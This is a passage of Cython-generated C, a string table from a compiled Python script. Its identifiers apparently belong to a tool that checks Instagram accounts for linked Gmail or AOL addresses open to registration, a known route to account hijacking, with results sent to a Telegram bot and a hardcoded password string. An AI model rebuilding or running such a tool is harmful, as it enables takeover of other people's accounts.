  {&__pyx_n_s_args, __pyx_k_args, sizeof(__pyx_k_args), 0, 0, 1, 1},
  {&__pyx_n_s_ascii_letters, __pyx_k_ascii_letters, sizeof(__pyx_k_ascii_letters), 0, 0, 1, 1},
  {&__pyx_n_u_authority, __pyx_k_authority, sizeof(__pyx_k_authority), 0, 1, 0, 1},
  {&__pyx_n_s_autoreset, __pyx_k_autoreset, sizeof(__pyx_k_autoreset), 0, 0, 1, 1},
  {&__pyx_n_u_azertyuiopmlkjhgfdsqwxcvbn, __pyx_k_azertyuiopmlkjhgfdsqwxcvbn, sizeof(__pyx_k_azertyuiopmlkjhgfdsqwxcvbn), 0, 1, 0, 1},
  {&__pyx_n_s_bademail, __pyx_k_bademail, sizeof(__pyx_k_bademail), 0, 0, 1, 1},
  {&__pyx_n_s_badinsta, __pyx_k_badinsta, sizeof(__pyx_k_badinsta), 0, 0, 1, 1},
  {&__pyx_n_s_bbk, __pyx_k_bbk, sizeof(__pyx_k_bbk), 0, 0, 1, 1},
  {&__pyx_n_s_bio, __pyx_k_bio, sizeof(__pyx_k_bio), 0, 0, 1, 1},
  {&__pyx_n_u_biography, __pyx_k_biography, sizeof(__pyx_k_biography), 0, 1, 0, 1},
  {&__pyx_n_s_bizz, __pyx_k_bizz, sizeof(__pyx_k_bizz), 0, 0, 1, 1},
  {&__pyx_n_s_blue, __pyx_k_blue, sizeof(__pyx_k_blue), 0, 0, 1, 1},
  {&__pyx_kp_u_browser_fp_data_7B_22language_22, __pyx_k_browser_fp_data_7B_22language_22, sizeof(__pyx_k_browser_fp_data_7B_22language_22), 0, 1, 0, 0},
  {&__pyx_n_u_c80c5fb30dfae9e273e4009f03b18280, __pyx_k_c80c5fb30dfae9e273e4009f03b18280, sizeof(__pyx_k_c80c5fb30dfae9e273e4009f03b18280), 0, 1, 0, 1},
  {&__pyx_kp_u_cacheStored_crumb, __pyx_k_cacheStored_crumb, sizeof(__pyx_k_cacheStored_crumb), 0, 1, 0, 0},
  {&__pyx_n_s_cc, __pyx_k_cc, sizeof(__pyx_k_cc), 0, 0, 1, 1},
  {&__pyx_n_s_cfonts, __pyx_k_cfonts, sizeof(__pyx_k_cfonts), 0, 0, 1, 1},
  {&__pyx_n_s_char, __pyx_k_char, sizeof(__pyx_k_char), 0, 0, 1, 1},
  {&__pyx_n_u_chat_id, __pyx_k_chat_id, sizeof(__pyx_k_chat_id), 0, 1, 0, 1},
  {&__pyx_n_s_check, __pyx_k_check, sizeof(__pyx_k_check), 0, 0, 1, 1},
  {&__pyx_n_s_check_aol, __pyx_k_check_aol, sizeof(__pyx_k_check_aol), 0, 0, 1, 1},
  {&__pyx_n_s_check_gmail, __pyx_k_check_gmail, sizeof(__pyx_k_check_gmail), 0, 0, 1, 1},
  {&__pyx_n_s_choice, __pyx_k_choice, sizeof(__pyx_k_choice), 0, 0, 1, 1},
  {&__pyx_n_s_choices, __pyx_k_choices, sizeof(__pyx_k_choices), 0, 0, 1, 1},
  {&__pyx_n_u_clear, __pyx_k_clear, sizeof(__pyx_k_clear), 0, 1, 0, 1},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_close, __pyx_k_close, sizeof(__pyx_k_close), 0, 0, 1, 1},
  {&__pyx_n_u_cmp, __pyx_k_cmp, sizeof(__pyx_k_cmp), 0, 1, 0, 1},
  {&__pyx_n_s_colorama, __pyx_k_colorama, sizeof(__pyx_k_colorama), 0, 0, 1, 1},
  {&__pyx_kp_u_content_type, __pyx_k_content_type, sizeof(__pyx_k_content_type), 0, 1, 0, 0},
  {&__pyx_kp_u_continue_https_3A_2F_2Fmail_goog, __pyx_k_continue_https_3A_2F_2Fmail_goog, sizeof(__pyx_k_continue_https_3A_2F_2Fmail_goog), 0, 1, 0, 0},
  {&__pyx_n_s_cookies, __pyx_k_cookies, sizeof(__pyx_k_cookies), 0, 0, 1, 1},
  {&__pyx_n_u_cors, __pyx_k_cors, sizeof(__pyx_k_cors), 0, 1, 0, 1},
  {&__pyx_n_u_creator, __pyx_k_creator, sizeof(__pyx_k_creator), 0, 1, 0, 1},
  {&__pyx_n_s_crumb, __pyx_k_crumb, sizeof(__pyx_k_crumb), 0, 0, 1, 1},
  {&__pyx_n_s_csrf, __pyx_k_csrf, sizeof(__pyx_k_csrf), 0, 0, 1, 1},
  {&__pyx_n_u_csrftoken, __pyx_k_csrftoken, sizeof(__pyx_k_csrftoken), 0, 1, 0, 1},
  {&__pyx_n_u_csrftoken_2, __pyx_k_csrftoken_2, sizeof(__pyx_k_csrftoken_2), 0, 1, 0, 1},
  {&__pyx_n_s_cyan, __pyx_k_cyan, sizeof(__pyx_k_cyan), 0, 0, 1, 1},
  {&__pyx_n_s_data, __pyx_k_data, sizeof(__pyx_k_data), 0, 0, 1, 1},
  {&__pyx_n_u_data, __pyx_k_data, sizeof(__pyx_k_data), 0, 1, 0, 1},
  {&__pyx_kp_u_data_initial_setup_data_null_nul, __pyx_k_data_initial_setup_data_null_nul, sizeof(__pyx_k_data_initial_setup_data_null_nul), 0, 1, 0, 0},
  {&__pyx_n_s_date, __pyx_k_date, sizeof(__pyx_k_date), 0, 0, 1, 1},
  {&__pyx_n_s_datetime, __pyx_k_datetime, sizeof(__pyx_k_datetime), 0, 0, 1, 1},
  {&__pyx_n_s_dev, __pyx_k_dev, sizeof(__pyx_k_dev), 0, 0, 1, 1},
  {&__pyx_n_s_device_id, __pyx_k_device_id, sizeof(__pyx_k_device_id), 0, 0, 1, 1},
  {&__pyx_n_u_device_id, __pyx_k_device_id, sizeof(__pyx_k_device_id), 0, 1, 0, 1},
  {&__pyx_n_u_deviceinfo, __pyx_k_deviceinfo, sizeof(__pyx_k_deviceinfo), 0, 1, 0, 1},
  {&__pyx_n_s_digits, __pyx_k_digits, sizeof(__pyx_k_digits), 0, 0, 1, 1},
  {&__pyx_n_u_doc_id, __pyx_k_doc_id, sizeof(__pyx_k_doc_id), 0, 1, 0, 1},
  {&__pyx_kp_u_done_https_3A_2F_2Fwww_aol_com, __pyx_k_done_https_3A_2F_2Fwww_aol_com, sizeof(__pyx_k_done_https_3A_2F_2Fwww_aol_com), 0, 1, 0, 0},
  {&__pyx_kp_u_done_https_3A_2F_2Fwww_aol_com_2, __pyx_k_done_https_3A_2F_2Fwww_aol_com_2, sizeof(__pyx_k_done_https_3A_2F_2Fwww_aol_com_2), 0, 1, 0, 0},
  {&__pyx_n_s_dumps, __pyx_k_dumps, sizeof(__pyx_k_dumps), 0, 0, 1, 1},
  {&__pyx_n_s_e, __pyx_k_e, sizeof(__pyx_k_e), 0, 0, 1, 1},
  {&__pyx_n_s_email, __pyx_k_email, sizeof(__pyx_k_email), 0, 0, 1, 1},
  {&__pyx_n_u_email, __pyx_k_email, sizeof(__pyx_k_email), 0, 1, 0, 1},
  {&__pyx_n_s_emails, __pyx_k_emails, sizeof(__pyx_k_emails), 0, 0, 1, 1},
  {&__pyx_n_u_empty, __pyx_k_empty, sizeof(__pyx_k_empty), 0, 1, 0, 1},
  {&__pyx_kp_u_en_GB_en_US, __pyx_k_en_GB_en_US, sizeof(__pyx_k_en_GB_en_US), 0, 1, 0, 0},
  {&__pyx_kp_u_en_US_en_q_0_9, __pyx_k_en_US_en_q_0_9, sizeof(__pyx_k_en_US_en_q_0_9), 0, 1, 0, 0},
  {&__pyx_n_s_enter, __pyx_k_enter, sizeof(__pyx_k_enter), 0, 0, 1, 1},
  {&__pyx_kp_u_errors, __pyx_k_errors, sizeof(__pyx_k_errors), 0, 1, 0, 0},
  {&__pyx_n_s_eval, __pyx_k_eval, sizeof(__pyx_k_eval), 0, 0, 1, 1},
  {&__pyx_n_s_exit, __pyx_k_exit, sizeof(__pyx_k_exit), 0, 0, 1, 1},
  {&__pyx_n_s_exit_2, __pyx_k_exit_2, sizeof(__pyx_k_exit_2), 0, 0, 1, 1},
  {&__pyx_n_s_f, __pyx_k_f, sizeof(__pyx_k_f), 0, 0, 1, 1},
  {&__pyx_kp_u_f_req, __pyx_k_f_req, sizeof(__pyx_k_f_req), 0, 1, 0, 0},
  {&__pyx_n_s_ff, __pyx_k_ff, sizeof(__pyx_k_ff), 0, 0, 1, 1},
  {&__pyx_n_s_first_name, __pyx_k_first_name, sizeof(__pyx_k_first_name), 0, 0, 1, 1},
  {&__pyx_n_u_first_name, __pyx_k_first_name, sizeof(__pyx_k_first_name), 0, 1, 0, 1},
  {&__pyx_n_s_flush, __pyx_k_flush, sizeof(__pyx_k_flush), 0, 0, 1, 1},
  {&__pyx_n_u_follower_count, __pyx_k_follower_count, sizeof(__pyx_k_follower_count), 0, 1, 0, 1},
  {&__pyx_n_u_following_count, __pyx_k_following_count, sizeof(__pyx_k_following_count), 0, 1, 0, 1},
  {&__pyx_n_s_fowg, __pyx_k_fowg, sizeof(__pyx_k_fowg), 0, 0, 1, 1},
  {&__pyx_n_s_fows, __pyx_k_fows, sizeof(__pyx_k_fows), 0, 0, 1, 1},
  {&__pyx_n_s_full_name, __pyx_k_full_name, sizeof(__pyx_k_full_name), 0, 0, 1, 1},
  {&__pyx_n_u_full_name, __pyx_k_full_name, sizeof(__pyx_k_full_name), 0, 1, 0, 1},
  {&__pyx_n_s_g, __pyx_k_g, sizeof(__pyx_k_g), 0, 0, 1, 1},
  {&__pyx_n_u_gads, __pyx_k_gads, sizeof(__pyx_k_gads), 0, 1, 0, 1},
  {&__pyx_n_s_generate_user_agent, __pyx_k_generate_user_agent, sizeof(__pyx_k_generate_user_agent), 0, 0, 1, 1},
  {&__pyx_n_s_genexpr, __pyx_k_genexpr, sizeof(__pyx_k_genexpr), 0, 0, 1, 1},
  {&__pyx_n_s_get, __pyx_k_get, sizeof(__pyx_k_get), 0, 0, 1, 1},
  {&__pyx_kp_u_getChat, __pyx_k_getChat, sizeof(__pyx_k_getChat), 0, 1, 0, 0},
  {&__pyx_kp_u_getChatMember_chat_id, __pyx_k_getChatMember_chat_id, sizeof(__pyx_k_getChatMember_chat_id), 0, 1, 0, 0},
  {&__pyx_kp_u_getMe, __pyx_k_getMe, sizeof(__pyx_k_getMe), 0, 1, 0, 0},
  {&__pyx_n_s_get_bot_info, __pyx_k_get_bot_info, sizeof(__pyx_k_get_bot_info), 0, 0, 1, 1},
  {&__pyx_n_s_get_dict, __pyx_k_get_dict, sizeof(__pyx_k_get_dict), 0, 0, 1, 1},
  {&__pyx_n_s_get_user_info, __pyx_k_get_user_info, sizeof(__pyx_k_get_user_info), 0, 0, 1, 1},
  {&__pyx_kp_u_gf_uar_1, __pyx_k_gf_uar_1, sizeof(__pyx_k_gf_uar_1), 0, 1, 0, 0},
  {&__pyx_n_s_gg, __pyx_k_gg, sizeof(__pyx_k_gg), 0, 0, 1, 1},
  {&__pyx_n_s_ggb, __pyx_k_ggb, sizeof(__pyx_k_ggb), 0, 0, 1, 1},
  {&__pyx_kp_u_gmail_com, __pyx_k_gmail_com, sizeof(__pyx_k_gmail_com), 0, 1, 0, 0},
  {&__pyx_n_s_goodig, __pyx_k_goodig, sizeof(__pyx_k_goodig), 0, 0, 1, 1},
  {&__pyx_kp_u_google_accounts_xsrf, __pyx_k_google_accounts_xsrf, sizeof(__pyx_k_google_accounts_xsrf), 0, 1, 0, 0},
  {&__pyx_n_u_gpi, __pyx_k_gpi, sizeof(__pyx_k_gpi), 0, 1, 0, 1},
  {&__pyx_n_u_gpp, __pyx_k_gpp, sizeof(__pyx_k_gpp), 0, 1, 0, 1},
  {&__pyx_n_u_gpp_sid, __pyx_k_gpp_sid, sizeof(__pyx_k_gpp_sid), 0, 1, 0, 1},
  {&__pyx_n_s_green, __pyx_k_green, sizeof(__pyx_k_green), 0, 0, 1, 1},
  {&__pyx_n_s_group, __pyx_k_group, sizeof(__pyx_k_group), 0, 0, 1, 1},
  {&__pyx_n_u_guid, __pyx_k_guid, sizeof(__pyx_k_guid), 0, 1, 0, 1},
  {&__pyx_kp_u_gzip_deflate, __pyx_k_gzip_deflate, sizeof(__pyx_k_gzip_deflate), 0, 1, 0, 0},
  {&__pyx_n_s_hashlib, __pyx_k_hashlib, sizeof(__pyx_k_hashlib), 0, 0, 1, 1},
  {&__pyx_n_s_he3, __pyx_k_he3, sizeof(__pyx_k_he3), 0, 0, 1, 1},
  {&__pyx_n_s_headers, __pyx_k_headers, sizeof(__pyx_k_headers), 0, 0, 1, 1},
  {&__pyx_n_s_hexdigest, __pyx_k_hexdigest, sizeof(__pyx_k_hexdigest), 0, 0, 1, 1},
  {&__pyx_n_s_hits, __pyx_k_hits, sizeof(__pyx_k_hits), 0, 0, 1, 1},
  {&__pyx_n_s_host, __pyx_k_host, sizeof(__pyx_k_host), 0, 0, 1, 1},
  {&__pyx_kp_u_https_accounts_google_com, __pyx_k_https_accounts_google_com, sizeof(__pyx_k_https_accounts_google_com), 0, 1, 0, 0},
  {&__pyx_kp_u_https_accounts_google_com___sign, __pyx_k_https_accounts_google_com___sign, sizeof(__pyx_k_https_accounts_google_com___sign), 0, 1, 0, 0},
  {&__pyx_kp_u_https_accounts_google_com___sign_2, __pyx_k_https_accounts_google_com___sign_2, sizeof(__pyx_k_https_accounts_google_com___sign_2), 0, 1, 0, 0},
  {&__pyx_kp_u_https_accounts_google_com_signin, __pyx_k_https_accounts_google_com_signin, sizeof(__pyx_k_https_accounts_google_com_signin), 0, 1, 0, 0},
  {&__pyx_kp_u_https_accounts_google_com_signup, __pyx_k_https_accounts_google_com_signup, sizeof(__pyx_k_https_accounts_google_com_signup), 0, 1, 0, 0},
  {&__pyx_kp_u_https_accounts_google_com_signup_2, __pyx_k_https_accounts_google_com_signup_2, sizeof(__pyx_k_https_accounts_google_com_signup_2), 0, 1, 0, 0},
  {&__pyx_kp_u_https_api_telegram_org_bot, __pyx_k_https_api_telegram_org_bot, sizeof(__pyx_k_https_api_telegram_org_bot), 0, 1, 0, 0},
  {&__pyx_kp_u_https_i_instagram_com_api_v1_acc, __pyx_k_https_i_instagram_com_api_v1_acc, sizeof(__pyx_k_https_i_instagram_com_api_v1_acc), 0, 1, 0, 0},
  {&__pyx_kp_u_https_login_aol_com, __pyx_k_https_login_aol_com, sizeof(__pyx_k_https_login_aol_com), 0, 1, 0, 0},
  {&__pyx_kp_u_https_login_aol_com_account_crea, __pyx_k_https_login_aol_com_account_crea, sizeof(__pyx_k_https_login_aol_com_account_crea), 0, 1, 0, 0},
  {&__pyx_kp_u_https_login_aol_com_account_crea_2, __pyx_k_https_login_aol_com_account_crea_2, sizeof(__pyx_k_https_login_aol_com_account_crea_2), 0, 1, 0, 0},
  {&__pyx_kp_u_https_login_aol_com_account_modu, __pyx_k_https_login_aol_com_account_modu, sizeof(__pyx_k_https_login_aol_com_account_modu), 0, 1, 0, 0},
  {&__pyx_kp_u_https_www_instagram_com, __pyx_k_https_www_instagram_com, sizeof(__pyx_k_https_www_instagram_com), 0, 1, 0, 0},
  {&__pyx_kp_u_https_www_instagram_com_accounts, __pyx_k_https_www_instagram_com_accounts, sizeof(__pyx_k_https_www_instagram_com_accounts), 0, 1, 0, 0},
  {&__pyx_kp_u_https_www_instagram_com_api_grap, __pyx_k_https_www_instagram_com_api_grap, sizeof(__pyx_k_https_www_instagram_com_api_grap), 0, 1, 0, 0},
  {&__pyx_n_s_hy, __pyx_k_hy, sizeof(__pyx_k_hy), 0, 0, 1, 1},
  {&__pyx_kp_u_i_instagram_com, __pyx_k_i_instagram_com, sizeof(__pyx_k_i_instagram_com), 0, 1, 0, 0},
  {&__pyx_n_s_id, __pyx_k_id, sizeof(__pyx_k_id), 0, 0, 1, 1},
  {&__pyx_n_u_id, __pyx_k_id, sizeof(__pyx_k_id), 0, 1, 0, 1},
  {&__pyx_n_u_ig_sig_key_version, __pyx_k_ig_sig_key_version, sizeof(__pyx_k_ig_sig_key_version), 0, 1, 0, 1},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_infoinsta, __pyx_k_infoinsta, sizeof(__pyx_k_infoinsta), 0, 0, 1, 1},
  {&__pyx_n_s_init, __pyx_k_init, sizeof(__pyx_k_init), 0, 0, 1, 1},
  {&__pyx_n_s_input, __pyx_k_input, sizeof(__pyx_k_input), 0, 0, 1, 1},
  {&__pyx_n_s_isPraise, __pyx_k_isPraise, sizeof(__pyx_k_isPraise), 0, 0, 1, 1},
  {&__pyx_n_u_is_business, __pyx_k_is_business, sizeof(__pyx_k_is_business), 0, 1, 0, 1},
  {&__pyx_n_u_is_private, __pyx_k_is_private, sizeof(__pyx_k_is_private), 0, 1, 0, 1},
  {&__pyx_n_s_is_user_in_channel, __pyx_k_is_user_in_channel, sizeof(__pyx_k_is_user_in_channel), 0, 0, 1, 1},
  {&__pyx_n_s_is_verified, __pyx_k_is_verified, sizeof(__pyx_k_is_verified), 0, 0, 1, 1},
  {&__pyx_n_u_is_verified, __pyx_k_is_verified, sizeof(__pyx_k_is_verified), 0, 1, 0, 1},
  {&__pyx_kp_u_j_0_u_1, __pyx_k_j_0_u_1, sizeof(__pyx_k_j_0_u_1), 0, 1, 0, 0},
  {&__pyx_n_s_json, __pyx_k_json, sizeof(__pyx_k_json), 0, 0, 1, 1},
  {&__pyx_n_s_k, __pyx_k_k, sizeof(__pyx_k_k), 0, 0, 1, 1},
  {&__pyx_kp_u_keep_alive, __pyx_k_keep_alive, sizeof(__pyx_k_keep_alive), 0, 1, 0, 0},
  {&__pyx_n_s_line, __pyx_k_line, sizeof(__pyx_k_line), 0, 0, 1, 1},
  {&__pyx_n_s_loading_animation, __pyx_k_loading_animation, sizeof(__pyx_k_loading_animation), 0, 0, 1, 1},
  {&__pyx_n_s_loading_chars, __pyx_k_loading_chars, sizeof(__pyx_k_loading_chars), 0, 0, 1, 1},
  {&__pyx_kp_u_login_aol_com, __pyx_k_login_aol_com, sizeof(__pyx_k_login_aol_com), 0, 1, 0, 0},
  {&__pyx_n_u_lsd, __pyx_k_lsd, sizeof(__pyx_k_lsd), 0, 1, 0, 1},
  {&__pyx_n_u_m, __pyx_k_m, sizeof(__pyx_k_m), 0, 1, 0, 1},
  {&__pyx_n_s_magenta, __pyx_k_magenta, sizeof(__pyx_k_magenta), 0, 0, 1, 1},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_n_u_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 1, 0, 1},
  {&__pyx_n_s_main_2, __pyx_k_main_2, sizeof(__pyx_k_main_2), 0, 0, 1, 1},
  {&__pyx_n_s_md5, __pyx_k_md5, sizeof(__pyx_k_md5), 0, 0, 1, 1},
  {&__pyx_n_u_media_count, __pyx_k_media_count, sizeof(__pyx_k_media_count), 0, 1, 0, 1},
  {&__pyx_n_u_member, __pyx_k_member, sizeof(__pyx_k_member), 0, 1, 0, 1},
  {&__pyx_n_s_memo, __pyx_k_memo, sizeof(__pyx_k_memo), 0, 0, 1, 1},
  {&__pyx_n_s_meta, __pyx_k_meta, sizeof(__pyx_k_meta), 0, 0, 1, 1},
  {&__pyx_kp_u_mid_ZVfGvgABAAGoQqa7AY3mgoYBV1nP, __pyx_k_mid_ZVfGvgABAAGoQqa7AY3mgoYBV1nP, sizeof(__pyx_k_mid_ZVfGvgABAAGoQqa7AY3mgoYBV1nP), 0, 1, 0, 0},
  {&__pyx_kp_u_multiDomain_tos0_oath_freereg_7, __pyx_k_multiDomain_tos0_oath_freereg_7, sizeof(__pyx_k_multiDomain_tos0_oath_freereg_7), 0, 1, 0, 0},
  {&__pyx_n_s_n1, __pyx_k_n1, sizeof(__pyx_k_n1), 0, 0, 1, 1},
  {&__pyx_n_s_n2, __pyx_k_n2, sizeof(__pyx_k_n2), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_n_s_name_2, __pyx_k_name_2, sizeof(__pyx_k_name_2), 0, 0, 1, 1},
  {&__pyx_kp_u_name_acrumb, __pyx_k_name_acrumb, sizeof(__pyx_k_name_acrumb), 0, 1, 0, 0},
  {&__pyx_kp_u_name_attrSetIndex_input_type_hid, __pyx_k_name_attrSetIndex_input_type_hid, sizeof(__pyx_k_name_attrSetIndex_input_type_hid), 0, 1, 0, 0},
  {&__pyx_kp_u_name_browser_fp_data_id_browser, __pyx_k_name_browser_fp_data_id_browser, sizeof(__pyx_k_name_browser_fp_data_id_browser), 0, 1, 0, 0},
  {&__pyx_kp_u_name_cacheStored_input_type_hidd, __pyx_k_name_cacheStored_input_type_hidd, sizeof(__pyx_k_name_cacheStored_input_type_hidd), 0, 1, 0, 0},
  {&__pyx_kp_u_name_crumb, __pyx_k_name_crumb, sizeof(__pyx_k_name_crumb), 0, 1, 0, 0},
  {&__pyx_kp_u_name_crumb_input_type_hidden_val, __pyx_k_name_crumb_input_type_hidden_val, sizeof(__pyx_k_name_crumb_input_type_hidden_val), 0, 1, 0, 0},
  {&__pyx_kp_u_name_sessionIndex, __pyx_k_name_sessionIndex, sizeof(__pyx_k_name_sessionIndex), 0, 1, 0, 0},
  {&__pyx_kp_u_name_specData, __pyx_k_name_specData, sizeof(__pyx_k_name_specData), 0, 1, 0, 0},
  {&__pyx_kp_u_name_specId, __pyx_k_name_specId, sizeof(__pyx_k_name_specId), 0, 1, 0, 0},
  {&__pyx_kp_u_no_REST, __pyx_k_no_REST, sizeof(__pyx_k_no_REST), 0, 1, 0, 0},
  {&__pyx_kp_u_null, __pyx_k_null, sizeof(__pyx_k_null), 0, 1, 0, 0},
  {&__pyx_kp_u_null_null_null_null_null_NL_nul, __pyx_k_null_null_null_null_null_NL_nul, sizeof(__pyx_k_null_null_null_null_null_NL_nul), 0, 1, 0, 0},
  {&__pyx_n_s_o, __pyx_k_o, sizeof(__pyx_k_o), 0, 0, 1, 1},
  {&__pyx_n_s_ok, __pyx_k_ok, sizeof(__pyx_k_ok), 0, 0, 1, 1},
  {&__pyx_n_u_ok, __pyx_k_ok, sizeof(__pyx_k_ok), 0, 1, 0, 1},
  {&__pyx_n_s_open, __pyx_k_open, sizeof(__pyx_k_open), 0, 0, 1, 1},
  {&__pyx_n_s_orange, __pyx_k_orange, sizeof(__pyx_k_orange), 0, 0, 1, 1},
  {&__pyx_n_u_origin, __pyx_k_origin, sizeof(__pyx_k_origin), 0, 1, 0, 1},
  {&__pyx_n_s_os, __pyx_k_os, sizeof(__pyx_k_os), 0, 0, 1, 1},
  {&__pyx_n_s_output, __pyx_k_output, sizeof(__pyx_k_output), 0, 0, 1, 1},
  {&__pyx_n_s_params, __pyx_k_params, sizeof(__pyx_k_params), 0, 0, 1, 1},
  {&__pyx_kp_u_password_Drahmed2006_mm_10_dd_2, __pyx_k_password_Drahmed2006_mm_10_dd_2, sizeof(__pyx_k_password_Drahmed2006_mm_10_dd_2), 0, 1, 0, 0},
  {&__pyx_kp_u_pip_install_colorama, __pyx_k_pip_install_colorama, sizeof(__pyx_k_pip_install_colorama), 0, 1, 0, 0},
  {&__pyx_kp_u_pip_install_python_cfonts, __pyx_k_pip_install_python_cfonts, sizeof(__pyx_k_pip_install_python_cfonts), 0, 1, 0, 0},
  {&__pyx_n_u_pk, __pyx_k_pk, sizeof(__pyx_k_pk), 0, 1, 0, 1},
  {&__pyx_n_s_post, __pyx_k_post, sizeof(__pyx_k_post), 0, 0, 1, 1},
  {&__pyx_n_s_pp, __pyx_k_pp, sizeof(__pyx_k_pp), 0, 0, 1, 1},
  {&__pyx_n_s_pppp, __pyx_k_pppp, sizeof(__pyx_k_pppp), 0, 0, 1, 1},
  {&__pyx_n_s_print, __pyx_k_print, sizeof(__pyx_k_print), 0, 0, 1, 1},
  {&__pyx_n_s_qq, __pyx_k_qq, sizeof(__pyx_k_qq), 0, 0, 1, 1},
  {&__pyx_n_u_query, __pyx_k_query, sizeof(__pyx_k_query), 0, 1, 0, 1},
  {&__pyx_n_s_r, __pyx_k_r, sizeof(__pyx_k_r), 0, 0, 1, 1},
  {&__pyx_n_u_r, __pyx_k_r, sizeof(__pyx_k_r), 0, 1, 0, 1},
  {&__pyx_n_s_randint, __pyx_k_randint, sizeof(__pyx_k_randint), 0, 0, 1, 1},
  {&__pyx_n_s_random, __pyx_k_random, sizeof(__pyx_k_random), 0, 0, 1, 1},
  {&__pyx_n_s_randrange, __pyx_k_randrange, sizeof(__pyx_k_randrange), 0, 0, 1, 1},
  {&__pyx_n_s_range, __pyx_k_range, sizeof(__pyx_k_range), 0, 0, 1, 1},
  {&__pyx_n_s_ranges, __pyx_k_ranges, sizeof(__pyx_k_ranges), 0, 0, 1, 1},
  {&__pyx_n_s_re, __pyx_k_re, sizeof(__pyx_k_re), 0, 0, 1, 1},
  {&__pyx_n_s_read, __pyx_k_read, sizeof(__pyx_k_read), 0, 0, 1, 1},
  {&__pyx_n_s_red, __pyx_k_red, sizeof(__pyx_k_red), 0, 0, 1, 1},
  {&__pyx_n_s_red6, __pyx_k_red6, sizeof(__pyx_k_red6), 0, 0, 1, 1},
  {&__pyx_n_u_referer, __pyx_k_referer, sizeof(__pyx_k_referer), 0, 1, 0, 1},
  {&__pyx_n_s_remove, __pyx_k_remove, sizeof(__pyx_k_remove), 0, 0, 1, 1},
  {&__pyx_n_s_render, __pyx_k_render, sizeof(__pyx_k_render), 0, 0, 1, 1},
  {&__pyx_n_u_render_surface, __pyx_k_render_surface, sizeof(__pyx_k_render_surface), 0, 1, 0, 1},
  {&__pyx_n_s_requests, __pyx_k_requests, sizeof(__pyx_k_requests), 0, 0, 1, 1},
  {&__pyx_n_s_res, __pyx_k_res, sizeof(__pyx_k_res), 0, 0, 1, 1},
  {&__pyx_n_s_res1, __pyx_k_res1, sizeof(__pyx_k_res1), 0, 0, 1, 1},
  {&__pyx_n_s_reset, __pyx_k_reset, sizeof(__pyx_k_reset), 0, 0, 1, 1},
  {&__pyx_n_s_response, __pyx_k_response, sizeof(__pyx_k_response), 0, 0, 1, 1},
  {&__pyx_n_s_rest, __pyx_k_rest, sizeof(__pyx_k_rest), 0, 0, 1, 1},
  {&__pyx_n_u_result, __pyx_k_result, sizeof(__pyx_k_result), 0, 1, 0, 1},
  {&__pyx_n_s_rich_console, __pyx_k_rich_console, sizeof(__pyx_k_rich_console), 0, 0, 1, 1},
  {&__pyx_n_s_rich_table, __pyx_k_rich_table, sizeof(__pyx_k_rich_table), 0, 0, 1, 1},
  {&__pyx_n_s_ror, __pyx_k_ror, sizeof(__pyx_k_ror), 0, 0, 1, 1},
  {&__pyx_n_s_rr, __pyx_k_rr, sizeof(__pyx_k_rr), 0, 0, 1, 1},
  {&__pyx_kp_u_s, __pyx_k_s, sizeof(__pyx_k_s), 0, 1, 0, 0},
  {&__pyx_n_s_s6, __pyx_k_s6, sizeof(__pyx_k_s6), 0, 0, 1, 1},
  {&__pyx_kp_u_same_origin, __pyx_k_same_origin, sizeof(__pyx_k_same_origin), 0, 1, 0, 0},
  {&__pyx_n_s_say, __pyx_k_say, sizeof(__pyx_k_say), 0, 0, 1, 1},
  {&__pyx_n_s_search, __pyx_k_search, sizeof(__pyx_k_search), 0, 0, 1, 1},
  {&__pyx_kp_u_sec_ch_ua, __pyx_k_sec_ch_ua, sizeof(__pyx_k_sec_ch_ua), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_ch_ua_mobile, __pyx_k_sec_ch_ua_mobile, sizeof(__pyx_k_sec_ch_ua_mobile), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_ch_ua_platform, __pyx_k_sec_ch_ua_platform, sizeof(__pyx_k_sec_ch_ua_platform), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_fetch_dest, __pyx_k_sec_fetch_dest, sizeof(__pyx_k_sec_fetch_dest), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_fetch_mode, __pyx_k_sec_fetch_mode, sizeof(__pyx_k_sec_fetch_mode), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_fetch_site, __pyx_k_sec_fetch_site, sizeof(__pyx_k_sec_fetch_site), 0, 1, 0, 0},
  {&__pyx_n_s_send, __pyx_k_send, sizeof(__pyx_k_send), 0, 0, 1, 1},
  {&__pyx_kp_u_sendMessage_chat_id, __pyx_k_sendMessage_chat_id, sizeof(__pyx_k_sendMessage_chat_id), 0, 1, 0, 0},
  {&__pyx_n_s_session, __pyx_k_session, sizeof(__pyx_k_session), 0, 0, 1, 1},
  {&__pyx_n_s_sessionIndex, __pyx_k_sessionIndex, sizeof(__pyx_k_sessionIndex), 0, 0, 1, 1},
  {&__pyx_kp_u_sessionIndex_2, __pyx_k_sessionIndex_2, sizeof(__pyx_k_sessionIndex_2), 0, 1, 0, 0},
  {&__pyx_n_u_signed_body, __pyx_k_signed_body, sizeof(__pyx_k_signed_body), 0, 1, 0, 1},
  {&__pyx_n_s_sleep, __pyx_k_sleep, sizeof(__pyx_k_sleep), 0, 0, 1, 1},
  {&__pyx_n_s_source, __pyx_k_source, sizeof(__pyx_k_source), 0, 0, 1, 1},
  {&__pyx_kp_s_source_py, __pyx_k_source_py, sizeof(__pyx_k_source_py), 0, 0, 1, 0},
  {&__pyx_n_s_specData, __pyx_k_specData, sizeof(__pyx_k_specData), 0, 0, 1, 1},
  {&__pyx_n_s_specId, __pyx_k_specId, sizeof(__pyx_k_specId), 0, 0, 1, 1},
  {&__pyx_n_s_split, __pyx_k_split, sizeof(__pyx_k_split), 0, 0, 1, 1},
  {&__pyx_n_s_splitlines, __pyx_k_splitlines, sizeof(__pyx_k_splitlines), 0, 0, 1, 1},
  {&__pyx_n_s_ss, __pyx_k_ss, sizeof(__pyx_k_ss), 0, 0, 1, 1},
